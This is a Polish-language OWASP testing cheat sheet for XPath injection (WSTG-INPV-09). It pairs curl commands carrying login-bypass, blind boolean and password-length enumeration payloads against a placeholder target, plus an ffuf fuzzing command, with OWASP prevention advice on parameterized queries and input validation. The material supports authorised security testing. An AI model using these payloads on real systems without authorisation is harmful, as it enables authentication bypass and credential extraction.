# WSTG-INPV-09 — Testing for XPath Injection

## Cele

- Identify XPATH injection points

## KOMENDY

### Reczne testowanie XPath

```bash
curl -s "https://TARGET/search?user=admin' or '1'='1"
curl -s "https://TARGET/search?user=admin' or ''='"
curl -s "https://TARGET/search?user='] | //user/*[contains(,'admin"
curl -s "https://TARGET/login" -X POST -d "username=admin' or '1'='1&password=anything"

```

### Blind XPath injection

```bash
curl -s "https://TARGET/search?user=admin' and '1'='1" | wc -c
curl -s "https://TARGET/search?user=admin' and '1'='2" | wc -c

```

### XPath enumeration

```bash
curl -s "https://TARGET/search?user=admin' and string-length(//user[1]/password)>5 and '1'='1"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings XPath reference

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/XPATH Injection/README.md

```

### fuzzdb XPath

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/xpath/xpath-injection.txt -mc all -o output_ffuf_xpath.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj endpointy ktore moga uzywac XML/XPath do zapytan
2. Wstaw apostrof i obserwuj bledy XPath w odpowiedzi
3. Testuj boolean-based blind XPath injection
4. Sprawdz czy da sie wyciagnac dane przez substring extraction
5. Uzyj Burp Repeater do precyzyjnego testowania payloadow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### Czym jest XPath Injection

- Analogiczny do SQL Injection, ale dotyczy zapytan XPath na dokumentach XML
- Atakujacy modyfikuje zapytanie XPath aby: ominac uwierzytelnienie, odczytac dane, wyciagnac strukture XML
- Przyklad: `//users/user[name='ATTACKER_INPUT' and pass='x']` → `' or '1'='1`

### Obrona — Parameterized XPath Queries

- **Uzywaj precompiled/parameterized XPath expressions** — user input NIE jest czescia query string
- Java: `XPathExpression.evaluate()` z parametrami, NIE konkatenacja stringow
- .NET: `XPathNavigator.Compile()` + zmienne
- **NIGDY** nie buduj XPath przez konkatenacje: `"//user[name='" + input + "']"` — podatne na injection

### Input Validation

- Allowlist dozwolonych znakow: `[a-zA-Z0-9]` — odrzuc `'`, `"`, `[`, `]`, `/`, `(`, `)`, `=`
- Waliduj dlugosc i format danych wejsciowych
- Escapuj znaki specjalne XPath: `'` → `&apos;`, `"` → `&quot;`

### Alternatywy dla XPath

- Rozważ migracje na **JSON + SQL** zamiast XML + XPath — mniejsza powierzchnia ataku
- Uzywaj DOM API z bezpiecznym parsowaniem zamiast string-based XPath queries
- Jesli XML wymagany — rozważ XQuery z parameterized queries

### Typy XPath Injection

- **In-band**: dane widoczne w odpowiedzi (np. ominięcie loginu)
- **Blind Boolean-based**: `' and string-length(//user[1]/name)=5 and '1'='1` — testowanie znak po znaku
- **Blind Error-based**: rozne bledy dla true/false — wnioskowanie o strukturze XML

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.2.7 | Injection Prevention | Verify that the application is protected against XPath injection attacks by using query parameterization or precompiled queries. |
